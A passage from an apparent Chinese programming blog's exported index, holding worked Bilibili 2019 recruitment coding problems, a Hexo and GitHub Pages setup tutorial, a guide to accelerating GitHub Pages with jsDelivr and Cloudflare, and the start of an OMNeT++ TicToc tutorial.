范围为\u0026gt;=0 正整数）个扭蛋进去，然后就可以扭到 2x+2 个 22 娘和 33 娘手中没有扭蛋，需要你帮她们设计一个方案，两人“轮流扭”（谁先开始不限，扭到的蛋可以交给对方使用），用“最少”的次数，使她们能够最后恰好扭到 N 个交给小电视君。\n输入描述: # 输入一个正整数，表示小电视君需要的 N 个扭蛋。\n输出描述: # 输出一个字符串，每个字符表示扭蛋机，字符只能包含\u0026quot;2\u0026quot;和\u0026quot;3\u0026quot;。\n输入例子 1: # 10\n输出例子 1: # 233\n思路有两种，一种是 BFS，一种是通过二叉树（其实你看到 2x+1 和 2x+2 就差不多知道了），因为这个题是这样的：\n可以看到，n 是奇数都是最后 22 扭的，n 是偶数都是最后 33 扭的，那么我们就可以倒着找出最终的顺序。找到下一层之后返回上一层，如果是奇数就是(n-1)/2,偶数就是(n-2)/2，具体可自行验证。给出 C++的示例代码：\n2.脸滚键盘 answer # 时间限制：1 秒\n空间限制：32768K\nav394281 中，充满威严的蕾米莉亚大小姐因为触犯某条禁忌，被隙间妖怪八云紫（紫 m……èi）按住头在键盘上滚动。 同样在弹幕里乱刷梗被紫姐姐做成罪袋的你被指派找到大小姐脸滚键盘打出的一行字中的第 k 个仅出现一次的字。 (为简化问题，大小姐没有滚出 ascii 字符集以外的字)\n输入描述: # 每个输入都有若干行，每行的第一个数字为k，表示求第k个仅出现一次的字。然后间隔一个半角空格，之后直到行尾的所有字符表示大小姐滚出的字符串S。\n输出描述: # 输出的每一行对应输入的每一行的答案，如果无解，输出字符串Myon~\n(请不要输出多余的空行）\n为了方便评测，如果答案存在且为 c，请输出[c]\n输入例子 1: # 2 misakamikotodaisuki\n3 !bakabaka~ bakabaka~ 1~2~9!\n3 3.1415926535897932384626433832795028841971693993751o582097494459211451488946419191919l91919hmmhmmahhhhhhhhhh\n7 www.bilibili.com/av170001\n1 111\n输出例子 1: # [d]\n[9]\n[l]\n[7]\nMyon~\n这个题有几种思路，最简单的还是使用映射(map)，让出现的每个字符对应到 0 上。扫描整个字符串，如果碰到一个字符，就让他对应的数+1，同时记录每个字符出现的顺序。然后扫描记录的顺序，找到第 k 个对应数是 1 的字符。但是我们看到题目说的是不超过 ASCII，所以直接用 ASCII 来映射就好了，给出示例 C++代码： 3.简单表达式计算 answer # 时间限制：1 秒\n空间限制：32768K\n给定一个合法的表达式字符串，其中只包含非负整数、加法、减法以及乘法符号（不会有括号），例如 7+3*4*5+2+4-3-1，请写程序计算该表达式的结果并输出；\n输入描述: # 输入有多行，每行是一个表达式，输入以 END 作为结束\n输出描述: # 每行表达式的计算结果\n输入例子 1: # 7+3*4*5+2+4-3-1\n2-3*1\nEND\n输出例子 1: # 69\n-1\n4.小 A 最多会新认识的多少人 answer # 时间限制：1 秒\n空间限制：32768K\n小 A 参加了一个 n 人的活动，每个人都有一个唯一编号i(i\u0026gt;=0 \u0026amp; i\u0026lt;n)，其中m对相互认识，在活动中两个人可以通过互相都认识的一个人介绍认识。现在问活动结束后，小 A 最多会认识多少人？\n输入描述: # 第一行聚会的人数：n（n\u0026gt;=3 \u0026amp; n\u0026lt;10000）；\n第二行小 A 的编号: ai（ai \u0026gt;= 0 \u0026amp; ai \u0026lt; n)；\n第三互相认识的数目: m（m\u0026gt;=1 \u0026amp; m \u0026lt; n(n-1)/2）；\n第 4 到 m+3 行为互相认识的对，以\u0026rsquo;,\u0026lsquo;分割的编号。\n输出描述: # 输出小 A 最多会新认识的多少人？\n输入例子 1: # 7\n5\n6\n1,0\n3,1\n4,1\n5,3\n6,1\n6,5\n输出例子 1: # 3\n这个题很明显的并查集，但是据其他人说用邻接表+BFS 也能做，但是这里我就不尝试了，给出并查集（最后要记得减去小 A 本来就认识的人）的 C++示例代码：\n5.山寨金闪闪 answer # 时间限制：3 秒\n空间限制：262144K\n金闪闪死后，红 A 拿到了王之财宝，里面有 n 个武器，长度各不相同。红 A 发现，拿其中三件武器首尾相接，组成一个三角形，进行召唤仪式，就可以召唤出一个山寨金闪闪。（例如，三件武器长度为 10、15、20，可以召唤成功。若长度为 10、11、30，首尾相接无法组成三角形，召唤失败。）红 A 于是开了一个金闪闪专卖店。他把王之财宝排成一排，每个客人会随机抽取到一个区间[l,r],客人可以选取区间里的三件武器进行召唤（客人都很聪慧，如果能找出来合适的武器，一定不会放过）。召唤结束后，客人要把武器原样放回去。m 个客人光顾以后，红 A 害怕过多的金闪闪愉悦太多男人，于是找到了你，希望你帮他统计出有多少山寨金闪闪被召唤出来。\n输入描述: # 第一行武器数量:n \u0026lt;= 1*10^7\n第二行空格分隔的 n 个 int，表示每件武器的长度。\n第三行顾客数量：m \u0026lt;= 1*10^6\n后面 m 行，每行两个 int l，r，表示每个客人被分配到的区间。（l\u0026lt;r）\n输出描述: # 山寨金闪闪数量。\n输入例子 1: # 5\n1 10 100 95 101\n4\n1 3\n2 4\n2 5\n3 5\n输出例子 1: # 3\n我知道这是《Fate》系列作品的衍生题目，我不玩游戏，但是咱也知道金闪闪是男的，为什么偷 ♂ 税男人啦。不过这个题很有说头，思路可以分为这几步：\n1，首先，判断三个正整数 a,b,c 是否能组成三角形，判断方法是：将 abc 升序排列，然后如果 a+b\u0026gt;c,则可以构成三角形。其次，判断一个区间[L,R]内是否能找到三个数使其构成三角形，可以将这 R-L+1 个元素取出并排序，然后从前往后三个三个判断。查询每次区间长度都在 1~1e7 之间，当然不能每次都暴力找，不然有 1e6 次查询，时间复杂度肯定爆炸，那么怎么处理呢？实际上，如果数一多，是非常容易构成三角形的，如果要刚好卡到边界，刚好不能构造成三角形（a+b==c），则要构造这样的数据：1，1，2，3，5，8\u0026hellip;\u0026hellip;。 巧了，其实就是斐波那契数列，题目的数据给出的数据在 int 范围内，然后我们发现大概在 40 多项的时候就不能构造出全都不满足构成三角形的数据了，下面是打表的出的结果。\nint 的范围最大是 2 的 32 次方，也就是 4294967296，到 48 项就超了，所以区间超过 47 必出金闪闪\n所以，只要在给出的区间长度较大的，一定能构成三角形，区间长度较小的，则可以存下来排序后判断，下面给出 C++示例代码：\n作者：高玩梁 https://www.bilibili.com/read/cv3831139 出处： bilibili\n6.比较两个版本字符串 version1 和 version2 answer # 时间限制：1 秒\n空间限制：32768K\n如果 version1 \u0026gt; version2 返回 1，如果 version1 \u0026lt; version2 返回-1，不然返回 0.\n输入的 version 字符串非空，只包含数字和字符.。.字符不代表通常意义上的小数点，只是用来区分数字序列。例如字符串 2.5 并不代表二点五，只是代表版本是第一级版本号是 2，第二级版本号是 5.\n输入描述: # 两个字符串，用空格分割。\n每个字符串为一个 version 字符串，非空，只包含数字和字符.\n输出描述: # 只能输出 1, -1，或 0\n输入例子 1: # 0.1 1.1\n输出例子 1: # -1\n7.精灵鼠从入口到出口的最少减少速度 answer # 时间限制：2 秒\n空间限制：131072K\n猛兽侠中精灵鼠在利剑飞船的追逐下逃到一个 n*n 的建筑群中，精灵鼠从（0,0）的位置进入建筑群，建筑群的出口位置为（n-1,n-1），建筑群的每个位置都有阻碍，每个位置上都会相当于给了精灵鼠一个固定值减速，因为精灵鼠正在逃命所以不能回头只能向前或者向下逃跑，现在问精灵鼠最少在减速多少的情况下逃出迷宫？\n输入描述: # 第一行迷宫的大小: n \u0026gt;=2 \u0026amp; n \u0026lt;= 10000；\n第 2 到 n+1 行，每行输入为以\u0026rsquo;,\u0026lsquo;分割的该位置的减速,减速 f \u0026gt;=1 \u0026amp; f \u0026lt; 10。\n输出描述: # 精灵鼠从入口到出口的最少减少速度？\n输入例子 1: # 3\n5,5,7\n6,7,8\n2,2,4\n输出例子 1: # 19\n8.顺时针打印数字矩阵 answer # 时间限制：1 秒\n空间限制：32768K\n给定一个数字矩阵，请设计一个算法从左上角开始顺时针打印矩阵元素\n输入描述: # 输入第一行是两个数字，分别代表行数 M 和列数 N；接下来是 M 行，每行 N 个数字，表示这个矩阵的所有元素；当读到 M=-1，N=-1 时，输入终止。\n输出描述: # 请按逗号分割顺时针打印矩阵元素（注意最后一个元素末尾不要有逗号！例如输出“1，2，3”，而不是“1，2， 3，”），每个矩阵输出完成后记得换行\n输入例子 1: # 3 3\n1 2 3\n4 5 6\n7 8 9\n-1 -1\n输出例子 1: # 1,2,3,6,9,8,7,4,5\n9.写一段程序判断 IP 字符串是否属于内网 IP answer # 时间限制：1 秒\n空间限制：32768K\n从业 666 年的 BILIBILI 网络安全工程师 KindMo 最近很困惑，公司有一个业务总是受到 SSRF 攻击。请帮他写一个程序，判断输入的字符串是否属于内网 IP，用于防御该漏洞。 我们知道常见的内网 IP 有，127.0.0.1，192.168.0.1 等。\n输入描述: # 每次输入仅包含一个 IP 字符串，即一个测试样例\n输出描述: # 对于每个测试实例输出整数 1 或 0，1 代表 True，即输入属于内网 IP，0 代表 False，即输入不属于内网 IP 或不是 IP 字符串。\n输入例子 1: # 42.96.146.169\n输出例子 1: # 0\n10.给定一个整数数组,判断其中是否有 3 个数和为 N answer # 时间限制：1 秒\n空间限制：131072K\n给定一个整数数组,判断其中是否有 3 个数和为 N\n输入描述: # 输入为一行\n逗号前为一个整数数组，每个元素间用空格隔开；逗号后为 N\n输出描述: # 输出 bool 值\nTrue 表示存在 3 个和为 N 的数\nFalse 表示不存在 3 个和为 N 的数\\\n输入例子 1: # 1 2 3 4 5,10\n输出例子 1: # True\n11.实现一个 HTML 语法检查器 answer # 时间限制：1 秒\n空间限制：32768K\n实现一个 HTML 语法检查器。HTML 语法规则简化如下：标签必须闭合，可以由开始和结束两个标签闭合，如\u0026lt;div\u0026gt;\u0026lt;/div\u0026gt;，也可以自闭合， 如\u0026lt;div /\u0026gt; 标签可以嵌套如\u0026lt;div\u0026gt;\u0026lt;a\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt;或者 \u0026lt;div\u0026gt;\u0026lt;a/\u0026gt;\u0026lt;/div\u0026gt;，但是标签不能交叉：\u0026lt;div\u0026gt;\u0026lt;a\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/a\u0026gt;是不允许的标签里可以有属性 如\u0026lt;div id=\u0026quot;a\u0026lt;1\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; 属性的规则是 name=\u0026ldquo;任意非引号字符\u0026rdquo;，多属性声明之间必须有空格，属性声明不符合规则时，整段 HTML 都算语法错误 输入文本只会出现字母 a-z 和\u0026lt;\u0026gt;\u0026quot;= 请用任意语言实现一个 HTML 语法检查器函数，有语法错误返回 1，没有语法错误返回 0\n输入描述: # 一行，一个 HTML 字符串\n输出描述: # 有语法错误返回 1，没有语法错误返回 0\n12.孙悟空的徒弟 answer # 时间限制：3 秒\n空间限制：131072K\n打败魔人布欧以后，孙悟空收了 n 个徒弟，每个徒弟战斗力各不相同。他教导所有的徒弟和体术，合体后战斗力为原战斗力相乘。任何两个徒弟都可以合体，所以一共有 n*(n-1)/2 种合体徒弟。有一天，他想考验一下孙悟天战斗力如何，希望在所有 n*(n-1)/2 种合体徒弟中选择战斗力第 k 高的，与孙悟天对战。可是孙悟空徒弟太多了，他已然懵逼，于是找到了你，请你帮他找到对的人。\n输入描述: # 第一行两个 int。徒弟数量：n \u0026lt;= 1*10^6；战斗力排名:k \u0026lt;= n*(n-1)/2\n第二行空格分隔 n 个 int，表示每个徒弟的战斗力。\n输出描述: # 战斗力排名 k 的合体徒弟战斗力。\n输入例子 1: # 5 2\n1 3 4 5 9\n输出例子 1: # 36\n13.翻转链表 answer # 时间限制：1 秒\n空间限制：32768K\n对于一个链表 L: L0→L1→…→Ln-1→Ln,\n将其翻转成 L0→Ln→L1→Ln-1→L2→Ln-2→…\n输入是一串数字，请将其转换成单链表格式之后，再进行操作\n输入描述: # 一串数字，用逗号分隔\n输出描述: # 一串数字，用逗号分隔\n输入例子 1: # 1,2,3,4,5\n输出例子 1: # 1,5,2,4,3\n14.ん\u0026hellip;红茶？answer # 时间限制：1 秒\n空间限制：131072K\n高贵的蕾米莉亚大小姐每天需要饮用定量 B 型血的红茶以保持威严，并且要分两杯在不同时段饮用。 女仆长十六夜咲夜每天可以制作很多杯不同剂量 B 型血的红茶供蕾米莉亚大小姐饮用。 某日，你和天才妖精琪露诺偷偷潜入红魔馆被咲夜抓住，要求在今日份的红茶中挑出所有满足大小姐要求的茶杯，否则……\n输入描述: # 每个样例有三行输入，第一行输入表示茶杯个数，第二行输入表示每份茶杯里的 B 型血剂量，第三行表示大小姐今天的定量\n输出描述: # 对每一个样例，输出所有可能的搭配方案，如果有多种方案，请按每个方案的第一杯 B 型血剂量的大小升序排列。\n如果无法找到任何一种满足大小姐的方案，输出\u0026quot;NO\u0026quot;(不包括引号)并换行。\n输入例子 1: # 7\n2 4 6 1 3 5 7\n7\n输出例子 1: # 1 6\n2 5\n3 4\n","date":"2019年10月23日","externalUrl":null,"permalink":"/posts/2019bilibili/","section":"","summary":"B站在牛客网上发了一套自己秋招的编程题，恰好今年被老师忽悠着去再参加一次蓝桥杯，所以给大家解析下。","title":"B站2019秋招编程题","type":"posts"},{"content":"","date":"2019年10月23日","externalUrl":null,"permalink":"/tags/%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9/","section":"Tags","summary":"","title":"哔哩哔哩","type":"tags"},{"content":"","date":"2019年10月23日","externalUrl":null,"permalink":"/tags/%E7%A7%8B%E6%8B%9B/","section":"Tags","summary":"","title":"秋招","type":"tags"},{"content":"","date":"2019年10月23日","externalUrl":null,"permalink":"/categories/%E7%AE%97%E6%B3%95/","section":"Categories","summary":"","title":"算法","type":"categories"},{"content":"","date":"2019年10月5日","externalUrl":null,"permalink":"/tags/github/","section":"Tags","summary":"","title":"Github","type":"tags"},{"content":"","date":"2019年10月5日","externalUrl":null,"permalink":"/tags/hexo/","section":"Tags","summary":"","title":"Hexo","type":"tags"},{"content":" [!WARNING] 此教程已过时，不再适用，仅供参考，本站已迁移至 Hugo\n安装 Node.js # 首先下载稳定版Node.js，我这里给的是 64 位的。\n安装选项全部默认，一路点击Next。\n最后安装好之后，按Win+R打开命令提示符，输入node -v和npm -v，如果出现版本号，那么就安装成功了。\n添加国内镜像源 # 如果没有梯子的话，可以使用阿里的国内镜像进行加速。\nnpm config set registry https://registry.npm.taobao.org 安装 Git # 为了把本地的网页文件上传到 github 上面去，我们需要用到分布式版本控制工具————Git[下载地址]。\n安装选项还是全部默认，只不过最后一步添加路径时选择Use Git from the Windows Command Prompt，这样我们就可以直接在命令提示符里打开 git 了。\n安装完成后在命令提示符中输入git --version验证是否安装成功。\n注册 Github 账号 # 接下来就去注册一个 github 账号，用来存放我们的网站。大多数小伙伴应该都有了吧，作为一个合格的程序猿（媛）还是要有一个的。\n打开https://github.com/，新建一个项目，输入自己的项目名字，后面一定要加.github.io后缀。名称一定要和你的 github 名字完全一样，比如你 github 名字叫abc，那么仓库名字一定要是abc.github.io。 然后项目就建成了，点击Settings，向下拉到最后有个GitHub Pages，点击Choose a theme选择一个主题。然后等一会儿，再回到GitHub Pages，在地址栏输入你的用户名.github.io就能看到你的主页了。 具体可以看我的B 站视频\n安装 Hexo # 在合适的地方新建一个文件夹，用来存放自己的博客文件，比如我的博客文件都存放在D:\\study\\program\\blog目录下。\n在该目录下右键点击Git Bash Here，打开 git 的控制台窗口，以后我们所有的操作都在 git 控制台进行，就不要用 Windows 自带的控制台了。\n定位到该目录下，输入npm i hexo-cli -g安装 Hexo。会有几个报错，无视它就行。\n安装完后输入hexo -v验证是否安装成功。\n然后就要初始化我们的网站，输入hexo init初始化文件夹，接着输入npm install安装必备的组件。\n这样本地的网站配置也弄好啦，输入hexo g \u0026amp;\u0026amp; hexo s打开本地服务器，然后浏览器打开http://localhost:4000/，就可以看到我们的博客啦\n按ctrl+c关闭本地服务器。\n连接 Github 与本地 # 首先右键打开 git bash，然后输入下面命令：\ngit config --global user.name \u0026#34;你GitHub的用户名\u0026#34; git config --global user.email \u0026#34;你GitHub注册时用的邮箱\u0026#34; ssh-keygen -t rsa -C \u0026#34;你GitHub注册时用的邮箱\u0026#34; 默认回车即可，然后输入cat C:\\Users\\(你电脑的用户名)\\.ssh\\id_rsa.pub，然后把输出的东西整个复制出来 打开github，在头像下面点击settings，再点击SSH and GPG keys，新建一个 SSH，Title 随便。\n把刚才输出的一串复制到 key 里即可\n输入ssh -T git@github.com，问 Are you sure you want to continue connecting (yes/no)?时输入 yes，如果出现你的用户名，那就成功了。\n打开博客根目录下的_config.yml文件，这是博客的配置文件，在这里你可以修改与博客相关的各种信息。\n修改最后一行的配置：\ndeploy: type: git repository: https://github.com/gaowanliang/gaowanliang.github.io branch: master repository 修改为你自己的 github 项目地址。\n写文章、发布文章 # 首先在博客根目录下右键打开 git bash，安装一个扩展npm i hexo-deployer-git。\n然后输入hexo new post \u0026quot;文章标题\u0026quot;，新建一篇文章。\n然后打开D:\\study\\program\\blog\\source\\_posts的目录，可以发现下面多了一个文件夹和一个.md文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。\n编写完 markdown 文件后，根目录下输入hexo g生成静态网页，然后输入hexo s可以本地预览效果，最后输入hexo d上传到 github 上。这时打开你的 github.io 主页就能看到发布的文章啦。\n绑定域名 # 现在默认的域名还是xxx.github.io，是不是很没有牌面？想不想也像我一样弄一个专属域名呢，首先你得购买一个域名，xx 云都能买，看你个人喜好了。\n以我的 Cloudflare 为例，如下图所示，添加这条解析记录： 然后打开你的 github 博客项目，点击settings，拉到下面Custom domain处，填上你自己的域名，保存： 这时候你的项目根目录应该会出现一个名为CNAME的文件了。如果没有的话，打开你本地博客/source目录，我的是D:\\study\\program\\blog\\source，新建CNAME文件，注意没有后缀。然后在里面写上你的域名，保存。最后运行hexo g、hexo d上传到 github。\n备份博客源文件 # 有时候我们想换一台电脑继续写博客，这时候就可以将博客目录下的所有源文件都上传到 github 上面。\n首先在 github 博客仓库下新建一个分支hexo，然后git clone到本地，把.git文件夹拿出来，放在博客根目录下。\n然后git checkout hexo切换到hexo分支，然后git add .，然后git commit -m \u0026amp;quot;xxx\u0026amp;quot;，最后git push origin hexo提交就行了。\n下载我弄好的主题包 # 大家也可以先用上文 hexo 安装方法安装完 hexo，然后直接下载这个文件，放到 theme 文件夹里，这是我修改完的基本没 bug 的定制化的博客，且用了这篇博客里说的加速方式，就不用你自己搞了，就可以直接拿来用啦。\n其他定制选项 # 可以看主题包作者写的这个\n","date":"2019年10月5日","externalUrl":null,"permalink":"/posts/blog-jiao-cheng/","section":"","summary":"如何用Hexo搭建一个高大上的博客","title":"高大上博客制作教程","type":"posts"},{"content":"","date":"2019年9月30日","externalUrl":null,"permalink":"/tags/github-pages/","section":"Tags","summary":"","title":"Github Pages","type":"tags"},{"content":"","date":"2019年9月30日","externalUrl":null,"permalink":"/tags/jsdelivr/","section":"Tags","summary":"","title":"Jsdelivr","type":"tags"},{"content":" 利用 jsDelivr 和 Cloudflare 免备案加速 Github Pages 网站 # 最近觉得学的东西不少，但是我从来没有记录过，最近正好因为新建了个博客，热乎劲还没过去，所以写点什么。\n我比较穷，不想买个服务器，买了也浪费，同时又想写博客。还不想通过 CSDN，简书之类的“广告网站”来写东西（最近发现在手机上用 Chrome 浏览器看简书的内容的时候会有弹屏广告，而且关不掉，遂放弃了简书）。突然想起了好久之前看过的 Github Pages，于是照着网上的教程进行了梳理，最终创建了一个我还比较满意的博客。只是有一个很严重的缺陷，就是国内访问太慢了，查了很多教程，发现都是些接入国内 CDN 的教程，国内 CDN 不仅贵，而且你不备案是不能用的。对于我这样一个没啥需求的用户，还得做网站备案，太麻烦了。于是想能不能曲线救国，最终找到了一个比较有效，能提高 Github Pages 速度的方法，还不用花钱（可能要花点，但是不多）。\n效果 # 先上效果（两个网页均是通过 清空缓存并硬性重新加载 方式来测试的）\n对于速度，大家可以自行测试，本站和 blinkfox.github.io 使用的是同一套模板，对方 9.9s 时还没跳到主页，我站 8s 就已经全部加载完成。那我做了什么改动呢？\n第一步——压缩图片 # 刚开始的时候没有头绪，因为不知道 Github Pages 能换域名。我一想，图片是显示的大头，先从压缩图片开始做起，刚好有一个公司 TinyPNG 提供了接口。首先我们需要打开它的官网，点击上面的 Developer API，输入你的名字和 Email 就可以获得每月 500 次的免费试用 API 的资格，你放心，这个量对于我们这种写小博客的人来说是非常够用的。申请完了之后要写个压缩的小程序。对于我来说，做个小程序还是轻而易举的，我在这里使用 python 来简单写写。根据官方文档说明，你首先需要下载它的库\npip install \u0026ndash;upgrade tinify\n然后就可以应用我这个遍历程序啦(突然发现被我删啦，重新写吧)\nimport tinify import os tinify.key = \u0026#34;YOUR_API_KEY\u0026#34; def tinify_all_pic(rootdir): _files = [] list = os.listdir(rootdir) for i in range(0, len(list)): path = os.path.join(rootdir, list[i]) if os.path.isdir(path): tinify_all_pic(path) if os.path.isfile(path): suffix = os.path.splitext(path)[-1] if suffix == \u0026#39;.png\u0026#39; or suffix == \u0026#39;.jpg\u0026#39;: print(path) source = tinify.from_file(path) source.to_file(path) tinify_all_pic(r\u0026#34;themes\\hexo-theme-matery\\source\u0026#34;) # 这里是用我存放资源的一个文件夹做示范，根据你们的文件夹不同进行相应的更换 压缩率通常在 50%以上（特别是你用超过 1M 以上的图片的时候），这样你在加载的时候不就提高 50%的加载速度了嘛 😂（不是）。\n这样操作之后你的加载速度可以提高至少 20%以上（一些模板资源也被压缩了，有些图片没法用网页 URL 来代替）。\n第二步——使用 jsDelivr 对博客静态资源进行静态加速 # jsDelivr 是一个很著名的 CDN 加速商，这个服务商只对你 GitHub 里的静态资源进行加速，但是不和 Cloudflare 一样免费提供全站加速，不过 Cf 在国内没有节点，这个公司在中国是依托网宿科技（QUANTIL）进行 CDN 加速。\n但是这也够了，也是提升我们速度的一个大杀器（Cloudflare 只是起辅助作用）。首先你需要先传一个你网站编译完后的稳定版本放在你的 GitHub 里，这样就可以进行加速了。我们只需要通过这样来引用你的资源\nhttps://cdn.jsdelivr.net/gh/user/repo@version/file\n举个例子，如果我们直接引用网站的资源是这样引用的。\nhttps://github.com/gaowanliang/gaowanliang.github.io/blob/master/js/matery.js\n其中 gaowanliang 是我的用户名，gaowanliang.github.io 是我的仓库名，那这样就可以进行套进去，效果就是这样:\nhttps://cdn.jsdelivr.net/gh/gaowanliang/gaowanliang.github.io/js/matery.js\n甚至如果你是 js，css 文件，可以进行 min 化，哪怕你的仓库里没有 min 的文件\nhttps://cdn.jsdelivr.net/gh/gaowanliang/gaowanliang.github.io/js/matery.min.js\n简单来说，如果你的文件放在 master 分支里，点开文件复制链接把链接里的 https://github.com/ 换成 https://cdn.jsdelivr.net/gh/ ，然后把 blob/master/ 删掉即可，然后就可以对你网站里的 js，css，图片大换特换啦。你比如说这个模板的作者把用到的 js，css 都写在了 _config.yml 里，我们就可以进行全部替换\n里面的图片也可以进行替换\n这样你的加载速度还能再上一个台阶。\n第三步——使用 Cloudflare 进行全站加速 # 因为 Cf 在国内没有节点，所以可能出现不加速反而减速的效果，但是有总比没有好，这里就简单说一说。\n首先你需要注册一个域名，国内国外都有相关的域名的注册商这里就不详述了，因为手头没有空闲的域名了，这里就用这篇博客和这篇博客的内容进行介绍。\n注册 Cloudflare 账号 # 要使用 Cloudflare 的服务，我们先要到官网注册账号：Cloudflare 注册\n点击 Sign Up 注册，填写邮箱和密码即可。之后填上你要加速的博客主域名，然后点击 Add Site 添加。\nCloudflare 在查询域名的 DNS 记录，点击 Next 继续，选择免费套餐\n这里我们是免费套餐，可以无视直接点击 Confirm 确认。\n修改 DNS 域名服务器 # 这里是域名的 DNS 记录查询结果，如有遗落，可自行添加。建议所有全部访问都通过 CDN 加速，其余默认，确认后继续。\n然后去你的域名提供商修改默认域名服务器为 Cloudflare 提供的，修改后继续，更改成功需要几分钟或更长的时间。时不时 Check 一下。\n更换到你的自定义域名 # 首先我们需要在仓库的设置里填入自定义域名，如下图：\n此时访问 example.zfanw.com，浏览器会提示：\nexample.zfanw.com’s server IP address could not be found.\nIP 地址未找到 - 因为我们还没做任何 DNS 解析的工作。\n绑定 CNAME # 一般情况下，我们是添加 A 记录将域名指向 IP。但 Github Pages 是通过 CNAME 绑定的 - CNAME 指 Canonical Name record，其实就是域名的别名。\n在 DNS 管理中添加一条 CNAME 记录，将 example 子域名指向 chenxsan.github.io\n然后就成功了\n享受一下吧 # 经过加速后你的网站就可以达到我说的速度啦，虽然没有很快，但是在免备案的情况下达到这个速度已经很好了（总比 10s 才相应网页好吧）。当然我还在想办法继续优化，有新方法还会更新的。\n","date":"2019年9月30日","externalUrl":null,"permalink":"/posts/speed-up-github-pages/","section":"","summary":"\u003ch1 class=\"relative group\"\u003e利用 jsDelivr 和 Cloudflare 免备案加速 Github Pages 网站 \n    \u003cdiv id=\"%E5%88%A9%E7%94%A8-jsdelivr-%E5%92%8C-cloudflare-%E5%85%8D%E5%A4%87%E6%A1%88%E5%8A%A0%E9%80%9F-github-pages-%E7%BD%91%E7%AB%99\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E5%88%A9%E7%94%A8-jsdelivr-%E5%92%8C-cloudflare-%E5%85%8D%E5%A4%87%E6%A1%88%E5%8A%A0%E9%80%9F-github-pages-%E7%BD%91%E7%AB%99\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cp\u003e最近觉得学的东西不少，但是我从来没有记录过，最近正好因为新建了个博客，热乎劲还没过去，所以写点什么。\u003c/p\u003e","title":"利用jsDelivr和Cloudflare免备案加速Github Pages网站","type":"posts"},{"content":"","date":"2019年9月30日","externalUrl":null,"permalink":"/tags/%E5%8A%A0%E9%80%9F/","section":"Tags","summary":"","title":"加速","type":"tags"},{"content":"","date":"2019年9月26日","externalUrl":null,"permalink":"/tags/omnet++/","section":"Tags","summary":"","title":"OMNET++","type":"tags"},{"content":"官方教程链接\nOMNET++入门教程|第 1 章 —— TicToc 模型 # 1 模型 # 首先，让我们从一个由两个节点组成的“网络”开始。节点将做一些简单的事情：其中一个节点将创建一个数据包，两个节点将继续来回传递相同的数据包。我将调用节点 tic 和 toc。稍后我们将逐步改进这个模型，在每个步骤中来引入 OMNET++特性。\n以下是从零开始实现第一个模拟的步骤。\n2 建立项目 # 首先打开 OMNET++的主界面，在主菜单中选择 File-\u0026gt; New -\u0026gt; OMNeT++ Project\n然后会出现这个界面 Project name 输入 TT（官方直接有一个 tictoc，如果输入 tictoc 就直接进入它的例子了，这里我们尝试从头开始写），其他的保持默认即可，点击 Next（别点错成 Finish），在让你选择 initial content时，选择 Empty project，然后一路 Next，最后无法选择 Next 时选择 Finish。最后的效果如图 3 添加 NED 文件 # OMNeT ++使用 NED 文件来定义组件并将它们组装成更大的单元，例如网络。我们开始通过添加 NED 文件来实现我们的模型。要将文件添加到项目中，请在左侧的项目资源管理器面板中右键单击项目目录 ，然后从菜单中选择 File-\u0026gt; New -\u0026gt; Network Description File (NED)。下面的 File name输入 tt.ned，然后点击 Finish 即可\n然后就可以开始构建网络了，切换到 Source 模式，然后输入以下内容：\nsimple Txc1 { gates: input in; output out; } // // Two instances (tic and toc) of Txc1 connected both ways. // Tic and toc will pass messages to one another. // network Tictoc1 { submodules: tic: Txc1; toc: Txc1; connections: tic.out --\u0026gt; { delay = 100ms; } --\u0026gt; toc.in; tic.in \u0026lt;-- { delay = 100ms; } \u0026lt;-- toc.out; } 然后切换回 Design 模式，就会看到类似如下的场景\n那我们来看一下两块代码是什么意思\n首先，第一块定义了一个简单模块 Txc1\n第二块定义了一个复合模块(类型) Tictoc1,其中包含子模块 tic 和 toc,它们都是简单模块类型 Txc1 的实例。Tic 的输出门(out)连接到 toc 的输入门(in),Toc 的输出门(out)连接到 tic 的输入门(in) ,传输延迟均为 100ms。\n4 添加 C++文件 # 现在，我们需要在 C++中实现 Txc1 简单模块的功能。从项目的菜单中选择 File -\u0026gt; Other,然后在下面的选择栏里选择 C/C++ -\u0026gt; Source File ，创建一个名为 txc1.cc 的文件，并输入以下内容：\n#include \u0026lt;string.h\u0026gt; #include \u0026lt;omnetpp.h\u0026gt; using namespace omnetpp; /** * Derive the Txc1 class from cSimpleModule. In the Tictoc1 network, * both the `tic\u0026#39; and `toc\u0026#39; modules are Txc1 objects, created by OMNeT++ * at the beginning of the simulation. */ class Txc1 : public cSimpleModule { protected: // The following redefined virtual function holds the algorithm. virtual void initialize() override; virtual void handleMessage(cMessage *msg) override; }; // The module class needs to be registered with OMNeT++ Define_Module(Txc1); void Txc1::initialize() { // Initialize is called at the beginning of the simulation. // To bootstrap the tic-toc-tic-toc process, one of the modules needs // to send the first message. Let this be `tic\u0026#39;. // Am I Tic or Toc? //仿真初始化，由节点tic发出第一条消息 if (strcmp(\u0026#34;tic\u0026#34;, getName()) == 0) { // create and send first message on gate \u0026#34;out\u0026#34;. \u0026#34;tictocMsg\u0026#34; is an // arbitrary string which will be the name of the message object. //创建输出门“out”发出第一条消息\u0026#34;tictocMsg\u0026#34;，不过发的啥这里并不关心 cMessage *msg = new cMessage(\u0026#34;tictocMsg\u0026#34;); send(msg, \u0026#34;out\u0026#34;); } } void Txc1::handleMessage(cMessage *msg) { // The handleMessage() method is called whenever a message arrives // at the module. Here, we just send it to the other module, through // gate `out\u0026#39;. Because both `tic\u0026#39; and `toc\u0026#39; does the same, the message // will bounce between the two. send(msg, \u0026#34;out\u0026#34;); // send out the message } 根据 NED 文件中定义的字模块关系，initialize() 函数中节点 tic 从输出门“out”发出的消息经过 100ms 传输延迟必然到达节点 toc 的输入门“tic”，并触发其 handleMessage() 函数。 